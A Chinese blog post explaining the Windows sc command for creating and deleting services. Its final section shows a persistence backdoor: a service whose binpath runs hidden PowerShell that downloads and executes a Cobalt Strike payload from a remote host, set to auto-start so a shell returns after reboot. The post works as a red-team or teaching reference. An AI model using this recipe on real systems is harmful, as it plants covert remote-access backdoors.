# Windows sc命令与权限维持


`sc`命令用来创建和删除windows服务

#### 使用SC命令创建windows服务

**命令格式：**

```bash
sc [servername] create Servicename [Optionname= Optionvalues]
```

```bash
# servername
可选，可以使用双斜线，如\\\\myserver，也可以是\\\\192.168.0.1来操作远程计算机。如果在本地计算机上操作就不用添加任何参数。

# Servicename
在注册表中为service key制定的名称。注意这个名称是不同于显示名称的（这个名称可以用net start和服务控制面板看到），而SC是使用服务键名来鉴别服务的。

# Optionname
这个optionname和optionvalues参数允许你指定操作命令参数的名称和数值。注意，这一点很重要在操作名称和等号之间是没有空格的。
如果你想要看每个命令的可以用的optionvalues，你可以使用sc command这样的格式。这会为你提供详细的帮助。

# Optionvalues
为optionname的参数的名称指定它的数值。有效数值范围常常限制于哪一个参数的optionname。如果要列表请用sc command来询问每个命令。
```



示例：

```bash
sc create svnservice binpath= "\"D:\Servers\Subversion\bin\svnserve.exe\" --service -r E:\SVN\repository" displayname= "SVNService" depend= Tcpip start= auto  

```

注意：

1. 在`option= xxxxx`格式中，`=`号和后面的内容一定要有空格，如`depend=  Tcpip`

2. 如果命令中的需要进行双引号的嵌套，使用反斜杠加引号 `\"`来进行转义处理。



#### 使用SC命令删除windows服务

从注册表中删除服务子项。如果服务正在运行或者另一个进程有一个该服务的打开句柄，那么此服务将标记为删除。

语法：

```bash
sc [ServerName] delete [ServiceName] 
```

示例：

```bash
sc delete svnservice
```





#### 服务自启动后门

这里使用Cobalt Strike生成了一个powershell的下载后门的payload（菜单栏，Attacks-->Web Drive

-by-->Scaripted Web Delivery，生成powershell后门）

```bash
sc create "Name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\"" 

sc description Name "Just For Test" # 设置服务的描述字符串 
sc config Name start= auto	 # 设置这个服务为自动启动 
net start Name ``# 启动服务

# 重启服务器后，成功返回一个shell
```



---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/windows-sc%E5%91%BD%E4%BB%A4/  

